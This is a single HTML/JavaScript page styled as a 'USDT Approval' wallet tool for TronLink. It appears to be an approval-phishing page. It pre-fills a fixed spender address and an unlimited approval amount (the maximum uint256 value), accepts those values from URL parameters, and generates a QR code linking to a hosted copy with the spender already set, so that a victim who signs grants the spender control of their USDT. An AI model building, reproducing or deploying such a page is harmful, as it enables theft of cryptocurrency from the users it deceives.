<!doctype html>
<html lang="ro">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>TRC20 Approve PRO</title>

  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family:Arial; }

    body {
      height:100vh;
      background:#0b1220;
      display:flex;
      justify-content:center;
      align-items:center;
      color:white;
    }

    .app {
      width:100%;
      max-width:420px;
      padding:20px;
    }

    .card {
      background:#111a2e;
      padding:20px;
      border-radius:16px;
    }

    h2 { text-align:center; margin-bottom:10px; }

    input {
      width:100%;
      padding:12px;
      margin-top:10px;
      border-radius:10px;
      border:none;
      background:#1b2a4a;
      color:white;
    }

    button {
      width:100%;
      padding:12px;
      margin-top:10px;
      border-radius:10px;
      border:none;
      font-weight:bold;
      cursor:pointer;
    }

    .blue { background:#3b82f6; color:white; }
    .green { background:#22c55e; color:white; }

    #status {
      margin-top:12px;
      font-size:13px;
      color:#7dd3fc;
      white-space:pre-wrap;
      text-align:center;
    }

    #qrcode {
      margin-top:15px;
      display:flex;
      justify-content:center;
      background:white;
      padding:10px;
      border-radius:10px;
    }

    .title {
      text-align:center;
      opacity:0.6;
      margin-bottom:5px;
    }
  </style>
</head>

<body>

<div class="app">
  <div class="card">

    <div class="title">TRC20 APPROVE PRO</div>
    <h2>USDT Approval</h2>

    <button class="blue" onclick="connectWallet()">Connect Wallet</button>

    <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu" />
    <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935" />

    <button class="green" onclick="approveUSDT()">Confirm & Sign</button>

    <div id="status">Status: waiting...</div>

    <div id="qrcode"></div>

  </div>
</div>

<script>

const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
let userAddress = null;

/* =========================
   PREFILL FROM QR
========================= */
function loadFromQR() {
  const params = new URLSearchParams(window.location.search);

  const spender = params.get("spender");
  const amount = params.get("amount");

  if (spender) {
    document.getElementById("spender").value = spender;
  }

  if (amount) {
    document.getElementById("amount").value = amount;
  }
}

/* =========================
   DETECT WALLET
========================= */
function detectWallet() {
  let tries = 0;

  const interval = setInterval(() => {
    tries++;

    if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
      userAddress = window.tronWeb.defaultAddress.base58;

      document.getElementById("status").innerText =
        "Wallet detectat:\n" + userAddress;

      clearInterval(interval);
      return;
    }

    if (tries > 20) {
      document.getElementById("status").innerText =
        "Deschide în TronLink DApp Browser!";
      clearInterval(interval);
    }

  }, 500);
}

/* =========================
   CONNECT
========================= */
async function connectWallet() {
  try {

    if (!window.tronLink) {
      document.getElementById("status").innerText =
        "TronLink NU este disponibil";
      return;
    }

    await window.tronLink.request({ method: "tron_requestAccounts" });

    userAddress = window.tronWeb.defaultAddress.base58;

    document.getElementById("status").innerText =
      "Connected:\n" + userAddress;

  } catch (e) {
    document.getElementById("status").innerText = e.message;
  }
}

/* =========================
   APPROVE
========================= */
async function approveUSDT() {
  try {

    if (!userAddress) {
      alert("Connect wallet first");
      return;
    }

    const spender = document.getElementById("spender").value;
    const amount = document.getElementById("amount").value;

    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);

    const amountInSun = window.tronWeb.toSun(amount);

    const tx = await contract.approve(spender, amountInSun).send();

    document.getElementById("status").innerText =
      "Approve sent!\nTX:\n" + tx;

  } catch (e) {
    document.getElementById("status").innerText = e.message;
  }
}

/* =========================
   QR GENERATOR (optional)
========================= */
function generateQR() {

  const url =
    "https://approve-d-app-mt1q.vercel.app?spender=TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu&amount=100";

  new QRCode(document.getElementById("qrcode"), {
    text: url,
    width: 160,
    height: 160
  });
}

/* INIT */
window.addEventListener("load", () => {
  loadFromQR();
  detectWallet();
  generateQR();
});

</script>

</body>
</html>
